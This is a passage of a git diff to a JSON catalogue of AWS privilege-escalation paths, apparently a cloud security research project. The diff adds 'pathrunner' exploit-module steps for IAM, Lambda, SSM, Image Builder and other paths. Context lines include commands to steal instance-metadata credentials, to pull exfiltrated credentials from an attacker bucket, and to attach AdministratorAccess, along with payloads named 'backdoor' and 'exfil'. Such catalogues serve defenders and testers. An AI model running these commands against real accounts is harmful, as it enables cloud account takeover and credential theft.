           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-011",
+          "description": "Load the iam-011 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set GROUP_NAME target-iam-group",
+          "description": "Set the GROUP_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -14964,8 +16925,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -15000,6 +16966,23 @@
           "step": 3,
           "command": "# Configure AWS CLI with the temporary credentials from assume-role",
           "description": "Use the elevated permissions of the assumed role"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-012",
+          "description": "Load the iam-012 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -15157,8 +17140,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -15196,6 +17184,23 @@
           "step": 2,
           "command": "aws sts get-caller-identity",
           "description": "Verify the new permissions are active"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-013",
+          "description": "Load the iam-013 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set GROUP_NAME target-iam-group",
+          "description": "Set the GROUP_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -15348,8 +17353,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -15444,6 +17454,23 @@
           "step": 6,
           "command": "# Verify administrative access\naws iam list-users --max-items 5\n",
           "description": "Verify that you now have administrative access by listing IAM users"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-014",
+          "description": "Load the iam-014 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -15556,8 +17583,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -15690,6 +17722,23 @@
           "command": "# Switch to the newly created credentials\nswap_keys\n",
           "description": "Configure Pacu to use the newly created access keys for the target user"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-015",
+          "description": "Load the iam-015 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_USER target-iam-user",
+          "description": "Set the TARGET_USER option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "limitations": "The attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the user. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.\n",
@@ -15810,8 +17859,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -15944,6 +17998,28 @@
           "command": "aws iam list-users --max-items 3",
           "description": "Verify administrative access was successfully obtained"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-016",
+          "description": "Load the iam-016 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set POLICY_ARN arn:aws:iam::123456789012:policy/TargetPolicy",
+          "description": "Set the POLICY_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "limitations": "This path provides administrative access only if the new policy version includes administrative permissions (e.g., AdministratorAccess equivalent). The attacker gains whatever permissions are specified in the new policy version they create. However, even limited additional permissions may enable multi-hop attacks.\n",
@@ -16048,8 +18124,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -16189,6 +18270,23 @@
           "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
           "description": "Assume the privileged role using Pacu"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-017",
+          "description": "Load the iam-017 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "limitations": "This path provides administrative access only if the inline policy includes administrative permissions. The attacker gains whatever permissions are specified in the inline policy they create. However, even limited additional permissions may enable multi-hop attacks.\n",
@@ -16313,8 +18411,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -16451,6 +18554,23 @@
           "command": "# Switch to the newly created credentials\nswap_keys\n",
           "description": "Configure Pacu to use the newly created access keys for the target user"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-018",
+          "description": "Load the iam-018 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_USER target-iam-user",
+          "description": "Set the TARGET_USER option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "limitations": "The attack provides administrative access because the attacker controls the inline policy document content. Unlike iam:AttachUserPolicy (which requires choosing from existing managed policies), iam:PutUserPolicy allows the attacker to embed any policy document directly into the user, guaranteeing administrative permissions regardless of what policies exist in the environment.\n",
@@ -16578,8 +18698,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -16693,6 +18818,23 @@
           "step": 10,
           "command": "# Verify administrative access\naws iam list-users --max-items 5\n",
           "description": "Verify that you now have administrative access using the assumed role credentials"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-019",
+          "description": "Load the iam-019 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -16813,8 +18955,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -16934,6 +19081,28 @@
           "step": 9,
           "command": "# Verify administrative access\naws iam list-users --max-items 5\n",
           "description": "Verify that you now have administrative access by listing IAM users"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-020",
+          "description": "Load the iam-020 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set POLICY_ARN arn:aws:iam::123456789012:policy/TargetPolicy",
+          "description": "Set the POLICY_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -17063,8 +19232,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -17198,6 +19372,23 @@
           "command": "# Use Pacu to assume the role\nrun sts__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role-name\n",
           "description": "Use Pacu to assume the role and obtain temporary credentials with administrative permissions"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use iam-021",
+          "description": "Load the iam-021 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set TARGET_ROLE TargetRoleName",
+          "description": "Set the TARGET_ROLE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "limitations": "This attack provides administrative access because the attacker controls the inline policy document content. Unlike `iam:AttachRolePolicy` (which requires choosing from existing managed policies), `iam:PutRolePolicy` allows the attacker to embed any policy document directly into the role, guaranteeing administrative permissions regardless of what policies exist in the environment.\n",
@@ -17330,8 +19521,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -17443,6 +19639,38 @@
           "step": 4,
           "command": "aws imagebuilder create-image \\\n  --image-recipe-arn RECIPE_ARN \\\n  --infrastructure-configuration-arn INFRA_CONFIG_ARN\n",
           "description": "Trigger the image build. Image Builder provisions an EC2 instance with the admin instance profile, runs the component shell commands, and the commands escalate privileges. The build typically takes 10-20 minutes."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use imagebuilder-001",
+          "description": "Load the imagebuilder-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_PROFILE arn:aws:iam::123456789012:instance-profile/TargetInstanceProfile",
+          "description": "Set the INSTANCE_PROFILE option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -17582,8 +19810,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -17665,6 +19898,38 @@
           "step": 4,
           "command": "aws kinesisanalyticsv2 describe-application \\\n  --application-name privesc-flink-app \\\n  --query 'ApplicationDetail.ApplicationStatus' \\\n  --output text\n",
           "description": "Poll application status. Once RUNNING, check for IAM policy attachment to confirm escalation succeeded."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use kinesisanalytics-001",
+          "description": "Load the kinesisanalytics-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -17793,8 +20058,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -17851,6 +20121,33 @@
           "step": 2,
           "command": "run lambda__backdoor_new_roles --cleanup",
           "description": "Call the module in cleanup mode when you are done"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use lambda-001",
+          "description": "Load the lambda-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD exfil/response",
+          "description": "Select the exfil/response payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -18161,8 +20458,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -18209,6 +20511,43 @@
           "step": 3,
           "command": "aws dynamodb put-item --table-name TABLE_NAME --item '{\"id\":{\"S\":\"trigger\"}}'",
           "description": "Trigger the function by adding an item to the DynamoDB table"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use lambda-002",
+          "description": "Load the lambda-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD exfil/response",
+          "description": "Select the exfil/response payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set EVENT_SOURCE_ARN arn:aws:dynamodb::123456789012:table/target-table/stream/2026-01-01T00:00:00.000",
+          "description": "Set the EVENT_SOURCE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner set TABLE_NAME target-dynamodb-table",
+          "description": "Set the TABLE_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 7,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -18534,8 +20873,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -18585,6 +20929,33 @@
           "step": 4,
           "command": "# Wait for the function to be automatically invoked by triggers",
           "description": "Wait for the function to be invoked by its automatic triggers (EventBridge, S3 events, etc.)"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use lambda-003",
+          "description": "Load the lambda-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD exfil/response",
+          "description": "Select the exfil/response payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set FUNCTION_NAME target-lambda-function",
+          "description": "Set the FUNCTION_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -18886,8 +21257,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -18939,6 +21315,33 @@
           "step": 4,
           "command": "aws lambda invoke --function-name TARGET_FUNCTION output.txt",
           "description": "Manually invoke the function to execute the privilege escalation"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use lambda-004",
+          "description": "Load the lambda-004 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD exfil/response",
+          "description": "Select the exfil/response payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set FUNCTION_NAME target-lambda-function",
+          "description": "Set the FUNCTION_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -19248,8 +21651,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -19358,6 +21766,33 @@
           "step": 7,
           "command": "aws iam list-users --max-items 3",
           "description": "Verify that administrator access has been granted"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use lambda-005",
+          "description": "Load the lambda-005 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD exfil/response",
+          "description": "Select the exfil/response payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set FUNCTION_NAME target-lambda-function",
+          "description": "Set the FUNCTION_NAME option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -19633,8 +22068,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -19753,6 +22193,33 @@
           "step": 2,
           "command": "run lambda__backdoor_new_roles --cleanup",
           "description": "Call the module in cleanup mode when you are done"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use lambda-006",
+          "description": "Load the lambda-006 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD exfil/response",
+          "description": "Select the exfil/response payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -20044,8 +22511,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -20142,6 +22614,28 @@
           "step": 5,
           "command": "aws s3 cp s3://ATTACKER_BUCKET/exfil/creds.json /tmp/admin-creds.json\n\nAWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' /tmp/admin-creds.json) \\\nAWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' /tmp/admin-creds.json) \\\nAWS_SESSION_TOKEN=$(jq -r '.Token' /tmp/admin-creds.json) \\\naws iam attach-user-policy \\\n  --user-name STARTING_USER \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n",
           "description": "Retrieve the exfiltrated execution role credentials from S3 and use them directly to call iam:AttachUserPolicy, attaching AdministratorAccess to the starting user."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use omics-001",
+          "description": "Load the omics-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set CONTAINER_URI 123456789012.dkr.ecr.us-east-1.amazonaws.com/target-image:latest",
+          "description": "Set the CONTAINER_URI option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -20288,8 +22782,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -21781,6 +24280,38 @@
           "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME",
           "description": "Steal the temporary credentials for the instance's IAM role"
         }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ssm-001",
+          "description": "Load the ssm-001 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_ID i-0123456789abcdef0",
+          "description": "Set the INSTANCE_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
+        }
       ]
     },
     "recommendation": "Restrict access to `ssm:StartSession` using the principle of least privilege. Use the Resource and Condition elements in IAM policies to limit which instances a principal can start sessions on. Monitor use of this sensitive permission using CloudSIEM detections.",
@@ -21988,8 +24519,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -22035,6 +24571,38 @@
           "step": 2,
           "command": "aws ssm get-command-invocation --command-id @command-id --instance-id i-XXXXXXXXXXX",
           "description": "Retrieve the command output containing the temporary credentials"
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ssm-002",
+          "description": "Load the ssm-002 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set INSTANCE_ID i-0123456789abcdef0",
+          "description": "Set the INSTANCE_ID option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the TARGET_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 6,
+          "command": "pathrunner exploit",
+          "description": "Execute the privilege escalation."
         }
       ]
     },
@@ -22315,8 +24883,13 @@
     },
     "gitMetadata": {
       "created": "2026-09-17T18:25:17Z",
-      "lastUpdated": "2026-09-17T18:25:17Z",
+      "lastUpdated": "2026-10-09T14:39:51Z",
       "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        },
         {
           "name": "Vicky Barth",
           "email": "vicky.barth@datadoghq.com",
@@ -22404,6 +24977,38 @@
           "step": 4,
           "command": "aws iam list-attached-user-policies \\\n  --user-name STARTING_USER\n",
           "description": "Verify that AdministratorAccess is now attached to the starting user, confirming privilege escalation success."
+        }
+      ],
+      "pathrunner": [
+        {
+          "step": 1,
+          "command": "pathrunner use ssm-003",
+          "description": "Load the ssm-003 exploit module in Pathrunner."
+        },
+        {
+          "step": 2,
+          "command": "pathrunner show payloads",
+          "description": "List the payloads compatible with this module."
+        },
+        {
+          "step": 3,
+          "command": "pathrunner set PAYLOAD backdoor/attach-policy",
+          "description": "Select the backdoor/attach-policy payload."
+        },
+        {
+          "step": 4,
+          "command": "pathrunner set ROLE_ARN arn:aws:iam::123456789012:role/TargetRoleName",
+          "description": "Set the ROLE_ARN option (replace the placeholder with your target's real value)."
+        },
+        {
+          "step": 5,
+          "command": "pathrunner set TARGET_ARN arn:aws:iam::123456789012:role/TargetRoleName",
